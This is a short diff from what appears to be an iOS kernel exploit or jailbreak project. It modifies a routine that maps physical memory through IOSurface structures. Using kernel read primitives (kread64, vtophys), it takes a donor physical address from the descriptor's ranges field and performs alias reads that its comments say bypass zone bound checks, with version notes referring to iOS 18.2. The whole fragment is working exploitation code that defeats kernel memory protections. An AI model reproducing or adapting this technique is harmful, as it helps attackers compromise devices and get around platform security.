@@ -276,14 +276,16 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		return -1;
 	}
 
-	// donor PA: surface ranges element → alias read (no zone check).
-	// surface+0x360 = ranges element KERNEL VA (8B read inside 960B
-	// object — legal). vtophys on the element VA (kalloc-early pages,
-	// normally aliased), then 32B alias read of the 16B element + slack
-	// (NO zone check on alias VAs).
-	uint64_t elemVA = kread64(surface + 0x360);
+	// donor PA: v85 — the DESCRIPTOR's ranges field (desc+0x60) is the
+	// element pointer that's VALID every run (v75 pre,desc r60=valid VA;
+	// v84 proved surface+0x360 reads 0 on 18.2 — kept below as data only).
+	// vtophys on the element VA, then a 32B ALIAS read of the 16B element
+	// (aliases bypass zone bound checks — the element is unreachable only
+	// at its zone VA).
+	uint64_t elemVA = ranges;
+	uint64_t s360   = kread64(surface + 0x360); // observation only (v84: reads 0)
 	if (!elemVA) {
-		jb_tr_beacon("KMAP fail,elemva");
+		jb_tr_beacon("KMAP fail,elemva,s360=%llx", (unsigned long long)s360);
 		*uaddr = NULL;
 		return -1;
 	}
